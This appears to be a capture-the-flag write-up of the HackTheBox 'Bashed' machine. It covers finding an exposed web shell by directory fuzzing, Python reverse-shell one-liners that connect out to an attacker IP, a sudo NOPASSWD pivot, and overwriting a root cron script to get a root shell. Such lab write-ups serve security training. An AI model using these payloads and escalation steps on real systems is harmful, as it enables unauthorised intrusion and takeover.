# Bashed - HackTheBox Writeup

[Bashed](https://app.hackthebox.com/machines/Bashed) is an easy Linux machine on HackTheBox.
It relies on directory fuzzing to discover a web shell, then a sudo NOPASSWD misconfiguration to pivot to another user, and finally a root-owned cron job script that can be overwritten for privilege escalation.

**Difficulty**: Easy 
**Operating System**: Linux  
**Themes**: Directory Fuzzing, Web Shell, Sudo Misconfig, Cron Job Abuse

![](/assets/htbimages/conversor/bashed/attackvector.png)
---

## Reconnaissance

### Initial Port Scanning

**Port Scan**:
```bash
nmap -sCV 10.129.54.29
```

**Findings**:
```js
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

- **Port 80**: Apache httpd 2.4.18 (Ubuntu)

## Initial Access

I ran feroxbuster to fuzz for directories and files:
```js

```

**Findings**:

- `/dev/phpbash.min.php`
- `/dev/phpbash.php`

Accessing `/dev/phpbash.php` gave me a working web shell:

![alt text](/assets/htbimages/conversor/bashed/01.writeup-4.png)

## Lateral Movement

Browsing to `/home` revealed two users:

![alt text](/assets/htbimages/conversor/bashed/01.writeup-5.png)

- `arrexel` – holds `user.txt`
- `scriptmanager` – discovered to be useful later

### Reverse Shell

Python was available on the target, so I used it to get a proper reverse shell:
```bash
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.196",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

Started a listener and caught the shell:
```js
rlwrap nc -nlvp 4444
Connection from 10.129.54.29:53804
www-data@bashed:/home$
```

## Privilege Escalation

### From www-data to scriptmanager

Checked sudo permissions:
```js
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

`www-data` can run any command as `scriptmanager` with no password:
```js
www-data@bashed:/home$ sudo -u scriptmanager /bin/bash
sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/home$
```

### From scriptmanager to root

After gaining a shell as `scriptmanager`, I found a `/scripts` directory owned by that user:

![alt text](/assets/htbimages/conversor/bashed/01.writeup-6.png)

It contained two files:
1. `test.py` – a script that creates `test.txt`
2. `test.txt` – owned by root, created by `test.py`

This suggested a root-owned cron job was periodically executing `test.py`. I overwrote `test.py` with a reverse shell payload:
```bash
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.17.196",3030));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > test.py
```

Started a listener and waited for the cron job to trigger:
```js
rlwrap nc -nlvp 3030
Connection from 10.129.54.29:44348
/bin/sh: 0: can't access tty; job control turned off
# cd ~
# ls
root.txt
```

Got a root shell. Solved – happy hacking!
